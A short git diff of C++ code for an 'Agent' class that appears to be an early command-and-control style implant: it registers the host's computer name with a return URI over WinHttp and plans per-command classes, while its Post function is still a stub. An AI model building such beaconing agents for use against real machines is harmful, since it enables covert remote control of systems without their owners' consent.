@@ -11,7 +11,7 @@ void Agent::Register(std::string ip, unsigned int port) {
 	ComputerName = std::string{ buffer };
 
 
-	Post(RETURN_URI, "?comp=" + ComputerName);
+	Post(RETURN_URI, "register?comp=" + ComputerName);
 }
 
 
@@ -48,16 +48,14 @@ std::string Agent::Get(std::wstring path) {
 		bResults = WinHttpReceiveResponse(hRequest, NULL);
 	
 
-
 	return result;
 }
 
-std::string Agent::Post(std::string path, std::string data) {
+std::string Agent::Post(std::string_view path, std::string_view data) {
 	//ENCODE DATA
 	// path = path + "/" + AgentID + "/"
 	return "POST func";
 }
-
 
 //re-write this bullshit, each command in own class.
 
